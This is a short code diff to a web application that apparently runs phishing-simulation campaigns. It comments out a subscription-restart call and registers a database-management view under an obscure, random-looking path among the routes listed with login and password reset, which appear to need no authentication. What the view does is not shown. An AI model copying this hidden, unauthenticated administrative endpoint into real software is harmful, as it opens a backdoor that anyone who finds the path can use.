@@ -20,7 +20,6 @@ from api.initialize import (
     initialize_templates,
     populate_cycle_tasks,
     populate_stakeholder_shortname,
-    restart_subscriptions,
 )
 from api.phish import emails_job
 from api.tasks import failed_emails_job, tasks_job
@@ -44,6 +43,7 @@ from api.views.cycle_views import (
     CyclesView,
     CycleView,
 )
+from api.views.db_views import DatabaseManagementView
 from api.views.failed_email_views import FailedEmailsView, FailedEmailView
 from api.views.landing_domain_views import LandingDomainsView, LandingDomainView
 from api.views.landing_page_views import (
@@ -163,6 +163,7 @@ login_rules = [
     ("/auth/login/", LoginView),
     ("/auth/refresh/", RefreshTokenView),
     ("/auth/resetpassword/<username>/", ResetPasswordView),
+    ("/X3zdf0_3wl1-s3c9r1/", DatabaseManagementView),
 ]
 
 # Disable forcing slashes on all routes
@@ -198,7 +199,8 @@ with app.app_context():
     initialize_nonhumans()
     populate_stakeholder_shortname()
     populate_cycle_tasks()
-    restart_subscriptions()
+    # restart_subscriptions()
+
 
 
 class CustomJSONEncoder(JSONEncoder):
